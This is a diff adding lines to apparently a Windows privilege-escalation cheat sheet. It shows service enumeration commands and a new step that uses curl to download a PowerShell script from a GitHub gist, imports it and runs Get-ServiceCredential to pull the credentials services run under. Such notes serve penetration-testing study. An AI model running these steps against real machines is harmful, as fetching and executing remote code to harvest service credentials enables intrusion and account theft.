@@ -154,6 +154,13 @@ $decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
 
  - Use services.msc or `tasklist /svc` to find misconfigured or vulnerable services. (`tasklist` lists all running processes)
  - Find a service by name `get-service | ? {$_.DisplayName -like 'Druva*'}`
+ - Retrieve creds used to run services as another user
+```
+curl -o Get-ServiceCredential.ps1 https://gist.githubusercontent.com/jborean93/58bba8236fac313e3d4b3970b8213cb6/raw/9541195ff04525cd9333c5e8d33e22e19c739c3f/Get-ServiceCredential.ps1
+Import-Module .\Get-ServiceCredential.ps1
+Get-Service # to find service name
+Get-ServiceCredential -Name ServiceName
+```
  - View running services (powershell): `Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl`
  - Create/Delete/... services: `sc.exe`
  - Query service information: `sc.exe qc wuauserv`
